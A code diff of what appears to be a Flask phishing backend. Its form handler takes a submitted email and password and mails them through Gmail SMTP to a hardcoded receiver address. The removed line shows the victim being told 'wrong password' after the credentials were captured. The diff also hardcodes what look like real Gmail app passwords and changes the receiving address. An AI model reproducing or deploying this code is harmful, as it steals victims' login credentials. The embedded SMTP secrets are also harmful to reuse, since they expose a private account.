@@ -11,8 +11,8 @@ app.secret_key = 'your-secret-key-change-this-for-production'  # Change this to 
 SMTP_SERVER = "smtp.gmail.com"
 SMTP_PORT = 587
 SENDER_EMAIL = "nwekee125@gmail.com"
-SENDER_PASSWORD = "anku prrw cwqv wwlb"
-RECEIVER_EMAIL = "maxwell202201@gmail.com"
+SENDER_PASSWORD = "errp vgmx phns ibmz"
+RECEIVER_EMAIL = "nwekee125@gmail.com"
 
 @app.route('/')
 def index():
@@ -31,7 +31,7 @@ def submit_form():
     # Send email
     try:
         send_email(email, password)
-        flash('wrong password', 'error')
+        flash('Form submitted successfully!', 'success')
         # Refresh the page after successful submission
         return redirect(url_for('index'))
     except Exception as e:
@@ -65,5 +65,6 @@ def send_email(email, password):
     server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, text)
     server.quit()
 
-if __name__ == '__main__':
+# This is required for Vercel serverless deployment
+if __name__ == "__main__":
     app.run(debug=True)
